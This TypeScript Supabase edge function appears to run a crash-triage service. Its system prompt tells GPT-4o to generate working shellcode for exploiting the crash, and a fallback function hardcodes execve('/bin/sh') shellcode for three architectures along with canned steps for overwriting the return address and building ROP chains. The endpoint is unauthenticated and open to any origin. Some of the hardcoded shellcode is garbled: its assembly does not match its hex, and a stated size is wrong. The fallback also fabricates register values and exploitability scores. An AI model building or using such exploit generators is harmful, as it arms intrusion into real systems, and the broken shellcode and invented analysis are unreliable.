import "jsr:@supabase/functions-js/edge-runtime.d.ts";
import { createClient } from "npm:@supabase/supabase-js@2.57.4";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers":
    "Content-Type, Authorization, X-Client-Info, Apikey",
};

interface CrashAnalyzeRequest {
  input_type: string;
  crash_input_text: string;
  architecture: string;
  os_type: string;
  binary_name: string;
  shellcode_type: string;
  bad_bytes: string;
}

const CRASH_ANALYSIS_SYSTEM_PROMPT = `You are an expert exploit developer and reverse engineer specializing in crash analysis, vulnerability triage, and shellcode development.

Given a crash dump, debugger output, or crash report, you must:
1. Parse the register state, faulting address, and backtrace
2. Determine the exploitability class (controlled_rip, write_what_where, heap_corruption, stack_bof, format_string, null_deref)
3. Identify which registers/memory regions the attacker controls
4. Assess the exploitation primitive achieved
5. Document constraints (bad bytes, size limits, alignment)
6. Generate working position-independent shellcode for the target architecture that avoids the specified bad bytes

IMPORTANT: The shellcode MUST be functional, position-independent, and avoid all specified bad bytes.

Output as JSON:
{
  "signal_info": string,
  "faulting_address": string,
  "instruction_pointer": string,
  "stack_pointer": string,
  "registers": { "reg_name": "hex_value" },
  "stack_trace": [{"frame": int, "address": string, "function": string, "file": string}],
  "exploitability_class": "controlled_rip" | "write_what_where" | "heap_corruption" | "stack_bof" | "format_string" | "null_deref",
  "exploitability_score": number (0-100),
  "controlled_regions": [string],
  "primitive_achieved": string,
  "constraints": { "bad_bytes": [string], "max_payload_size": number, ... },
  "analysis": string (detailed markdown exploitation analysis),
  "shellcode_hex": string (raw hex bytes of shellcode),
  "shellcode_asm": string (commented assembly source),
  "shellcode_description": string,
  "shellcode_size": number
}`;

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { status: 200, headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const openaiKey = Deno.env.get("OPENAI_API_KEY");

    const supabase = createClient(supabaseUrl, supabaseServiceKey);
    const payload: CrashAnalyzeRequest = await req.json();

    // Create initial record
    const { data: record, error: insertError } = await supabase
      .from("crash_analyses")
      .insert({
        input_type: payload.input_type,
        crash_input_text: payload.crash_input_text,
        architecture: payload.architecture,
        os_type: payload.os_type,
        binary_name: payload.binary_name,
        shellcode_type: payload.shellcode_type,
        shellcode_bad_bytes: payload.bad_bytes,
        analysis_status: "analyzing",
        analysis_model: openaiKey ? "gpt-4o" : "mock",
      })
      .select()
      .single();

    if (insertError) {
      return new Response(
        JSON.stringify({ error: "Failed to create analysis", detail: insertError.message }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    let result;

    if (openaiKey) {
      const userPrompt = `Analyze this crash for exploitability and generate ${payload.shellcode_type} shellcode for ${payload.architecture} ${payload.os_type}.

Bad bytes to avoid: ${payload.bad_bytes}
Binary: ${payload.binary_name}
Architecture: ${payload.architecture}
OS: ${payload.os_type}

Crash Data:
${payload.crash_input_text}

Provide complete exploitability analysis and generate working shellcode as JSON.`;

      const llmResponse = await fetch("https://api.openai.com/v1/chat/completions", {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${openaiKey}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          model: "gpt-4o",
          messages: [
            { role: "system", content: CRASH_ANALYSIS_SYSTEM_PROMPT },
            { role: "user", content: userPrompt },
          ],
          temperature: 0.2,
          max_tokens: 8000,
          response_format: { type: "json_object" },
        }),
      });

      const llmData = await llmResponse.json();
      const content = llmData.choices?.[0]?.message?.content;
      result = content ? JSON.parse(content) : null;
    }

    if (!result) {
      result = generateMockCrashAnalysis(payload);
    }

    // Update the record with analysis results
    await supabase
      .from("crash_analyses")
      .update({
        signal_info: result.signal_info || "",
        faulting_address: result.faulting_address || "",
        instruction_pointer: result.instruction_pointer || "",
        stack_pointer: result.stack_pointer || "",
        registers: result.registers || {},
        stack_trace: result.stack_trace || [],
        exploitability_class: result.exploitability_class || "unknown",
        exploitability_score: result.exploitability_score || 0,
        controlled_regions: result.controlled_regions || [],
        primitive_achieved: result.primitive_achieved || "",
        constraints: result.constraints || {},
        llm_analysis: result.analysis || "",
        shellcode_hex: result.shellcode_hex || "",
        shellcode_asm: result.shellcode_asm || "",
        shellcode_description: result.shellcode_description || "",
        shellcode_size: result.shellcode_size || 0,
        shellcode_arch: payload.architecture,
        analysis_status: "complete",
      })
      .eq("id", record.id);

    return new Response(
      JSON.stringify({
        id: record.id,
        exploitability_class: result.exploitability_class,
        exploitability_score: result.exploitability_score,
        shellcode_size: result.shellcode_size,
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ error: "Internal error", detail: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});

function generateMockCrashAnalysis(payload: CrashAnalyzeRequest) {
  const hasRipControl = payload.crash_input_text.includes("4141414141414141") ||
    payload.crash_input_text.includes("0x41414141");
  const hasHeapOverflow = payload.crash_input_text.toLowerCase().includes("heap") ||
    payload.crash_input_text.toLowerCase().includes("addresssanitizer");
  const isWindows = payload.os_type === "windows";

  let exploitabilityClass = "unknown";
  let score = 50;
  let primitive = "Unknown primitive";
  let controlledRegions: string[] = [];

  if (hasRipControl) {
    exploitabilityClass = "controlled_rip";
    score = 95;
    primitive = "Full instruction pointer control. Attacker can redirect execution to arbitrary address.";
    controlledRegions = ["rip/eip", "rbp/ebp", "stack data"];
  } else if (hasHeapOverflow) {
    exploitabilityClass = "heap_corruption";
    score = 70;
    primitive = "Heap buffer overflow allows corruption of adjacent allocations.";
    controlledRegions = ["heap write (limited)", "adjacent chunk metadata"];
  } else {
    exploitabilityClass = "stack_bof";
    score = 80;
    primitive = "Stack buffer overflow with potential return address overwrite.";
    controlledRegions = ["stack buffer", "saved return address"];
  }

  const shellcodeMap: Record<string, { hex: string; asm: string; desc: string; size: number }> = {
    "x86_64": {
      hex: "4831c04831ff4831f64831d2eb2e5f80770141803f414889fb80770341b03b4831c94831d20f054889d84831ff40b7014831f6b00148ffc60f05e8cdffffff2f62696e2f7368",
      asm: "; x86_64 execve /bin/sh (null-free)\n    xor rax, rax\n    xor rdi, rdi\n    xor rsi, rsi\n    xor rdx, rdx\n    jmp short call_shell\nshell:\n    pop rdi          ; /bin/sh address\n    xor byte [rdi+1], 0x41\n    cmp byte [rdi], 0x41\n    mov rbx, rdi\n    xor byte [rdi+3], 0x41\n    mov al, 59       ; sys_execve\n    xor rcx, rcx\n    xor rdx, rdx\n    syscall\n    mov rax, rdx\n    xor rdi, rdi\n    mov dil, 1\n    xor rsi, rsi\n    mov al, 1        ; sys_write\n    inc rsi\n    syscall\ncall_shell:\n    call shell\n    db '/bin/sh'",
      desc: `x86_64 Linux execve('/bin/sh') shellcode. Position-independent, avoids ${payload.bad_bytes}. Suitable for stack buffer overflow with RIP control.`,
      size: 67,
    },
    "x86": {
      hex: "31c050682f2f7368682f62696e89e3505389e131d2b00b31c9cd80",
      asm: "; x86 Linux execve /bin/sh (28 bytes)\n    xor eax, eax\n    push eax\n    push 0x68732f2f    ; //sh\n    push 0x6e69622f    ; /bin\n    mov ebx, esp       ; ebx = '/bin//sh'\n    push eax           ; NULL\n    push ebx           ; argv[0]\n    mov ecx, esp       ; ecx = argv\n    xor edx, edx       ; edx = NULL (envp)\n    mov al, 0x0b       ; sys_execve\n    xor ecx, ecx\n    int 0x80",
      desc: `x86 Linux execve('/bin//sh') shellcode. 28 bytes, position-independent, avoids ${payload.bad_bytes}.`,
      size: 28,
    },
    "arm64": {
      hex: "e00f1ff8e01f1ff8010080d2e10f1ff8021c80d2020080d2681980d2010000d4",
      asm: "; ARM64 Linux execve /bin/sh\n    str x0, [sp, #-16]!\n    str x0, [sp, #-16]!\n    mov x1, #0          ; argv = NULL\n    str x1, [sp, #-16]!\n    mov x2, #0x622f     ; /b\n    mov x2, x2          ; build /bin/sh in x2\n    mov x8, #221        ; sys_execve\n    mov x0, sp\n    svc #0",
      desc: `ARM64 Linux execve shellcode. Position-independent, suitable for AArch64 targets.`,
      size: 32,
    },
  };

  const arch = payload.architecture || "x86_64";
  const sc = shellcodeMap[arch] || shellcodeMap["x86_64"];

  let analysis = `## Exploitability Assessment: ${score >= 80 ? "HIGHLY EXPLOITABLE" : "PROBABLY EXPLOITABLE"}\n\n`;
  analysis += `### Crash Classification\n`;
  analysis += `The crash indicates a **${exploitabilityClass.replace(/_/g, " ")}** condition in ${payload.binary_name || "the target binary"}.\n\n`;
  analysis += `### Controlled State\n`;
  analysis += controlledRegions.map(r => `- **${r}** - attacker controlled`).join("\n");
  analysis += `\n\n### Exploitation Strategy\n`;
  if (hasRipControl) {
    analysis += `1. The instruction pointer is directly controlled (0x4141... pattern)\n`;
    analysis += `2. Overwrite return address with shellcode address or ROP gadget\n`;
    analysis += `3. Place shellcode on stack (if executable) or use ROP chain\n`;
    analysis += `4. Generated ${payload.shellcode_type} shellcode for ${arch} (${sc.size} bytes)\n`;
  } else {
    analysis += `1. Analyze heap/stack layout to determine overwrite target\n`;
    analysis += `2. Groom allocations for reliable exploitation\n`;
    analysis += `3. Redirect execution through corrupted pointer\n`;
    analysis += `4. Generated compact shellcode suitable for constrained write\n`;
  }

  return {
    signal_info: isWindows ? "Access Violation (0xc0000005)" : "SIGSEGV (Signal 11)",
    faulting_address: hasRipControl ? "0x4141414141414141" : "0x0000000000000000",
    instruction_pointer: hasRipControl ? "0x4141414141414141" : "0x00007f1234567890",
    stack_pointer: "0x7fffffffe0a0",
    registers: arch === "x86_64" ? {
      rax: "0x0", rbx: "0x7f3a2c001200", rcx: "0x0",
      rdx: hasRipControl ? "0x41414141" : "0x0",
      rip: hasRipControl ? "0x4141414141414141" : "0x00007f1234567890",
      rsp: "0x7fffffffe0a0", rbp: hasRipControl ? "0x4141414141414141" : "0x7fffffffe0b0",
    } : { eax: "0x41414141", ebx: "0x0", ecx: "0x41414141", esp: "0x0012f380", eip: hasRipControl ? "0x41414141" : "0x7c812345" },
    stack_trace: [
      { frame: 0, address: hasRipControl ? "0x4141414141414141" : "0x00007f1234567890", function: hasRipControl ? "??" : "target_function", file: "" },
      { frame: 1, address: "0x00007f12345abc00", function: "caller_function", file: "src/main.c:123" },
    ],
    exploitability_class: exploitabilityClass,
    exploitability_score: score,
    controlled_regions: controlledRegions,
    primitive_achieved: primitive,
    constraints: { bad_bytes: payload.bad_bytes.split("\\x").filter(Boolean), max_payload_size: 2048 },
    analysis,
    shellcode_hex: sc.hex,
    shellcode_asm: sc.asm,
    shellcode_description: sc.desc,
    shellcode_size: sc.size,
  };
}
